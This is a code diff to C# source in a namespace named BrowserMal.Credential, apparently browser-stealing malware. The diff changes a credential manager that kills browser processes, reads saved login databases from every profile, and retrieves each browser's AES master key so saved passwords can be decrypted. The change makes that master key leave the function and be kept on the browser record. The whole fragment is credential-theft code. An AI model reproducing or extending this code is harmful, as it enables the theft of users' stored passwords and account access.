@@ -14,7 +14,7 @@ namespace BrowserMal.Credential
 
         public CredentialManager() => credentialModels = new Dictionary<string, List<CredentialModel>>();
 
-        public void Init(List<BrowserModel> browsers)
+        public void Init(ref List<BrowserModel> browsers)
         {
             foreach (BrowserModel browser in browsers)
             {
@@ -23,7 +23,8 @@ namespace BrowserMal.Credential
 
                 ProcessUtil.KillProcess(browser.ProcessName);
 
-                List<CredentialModel> logins = GetLogins(browser.Location);
+                List<CredentialModel> logins = GetLogins(browser.Location, out byte[] masterKey);
+                browser.MasterKey = masterKey;
 
                 if (logins.Count == 0)
                     continue;
@@ -34,23 +35,26 @@ namespace BrowserMal.Credential
             }
         }
 
-        private List<CredentialModel> GetLogins(string path)
+        private List<CredentialModel> GetLogins(string path, out byte[] masterKey)
         {
-            List<string> profiles = Browser.Util.GetAllProfiles(path);
+            List<string> profiles = Browser.Util.GetAllProfiles(path, Browser.Util.LOGIN_DATA);
             List<CredentialModel> creds = new List<CredentialModel>();
+            byte[] data = null;
 
             foreach (string profile in profiles)
             {
                 if (!File.Exists(profile))
                     continue;
 
-                creds.AddRange(GetProfileLogins(profile));
+                creds.AddRange(GetProfileLogins(profile, out byte[] masterkeyBytes));
+                data = masterkeyBytes;
             }
 
+            masterKey = data;
             return creds;
         }
 
-        private List<CredentialModel> GetProfileLogins(string path)
+        private List<CredentialModel> GetProfileLogins(string path, out byte[] masterKeyBytes)
         {
             List<CredentialModel> credentialModels = new List<CredentialModel>();
 
@@ -60,7 +64,12 @@ namespace BrowserMal.Credential
             byte[] masterKey = AesGcm256.GetMasterKey(path);
 
             if (masterKey == null)
+            {
+                masterKeyBytes = null;
                 return new List<CredentialModel>();
+            }
+
+            masterKeyBytes = masterKey;
 
             for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
             {
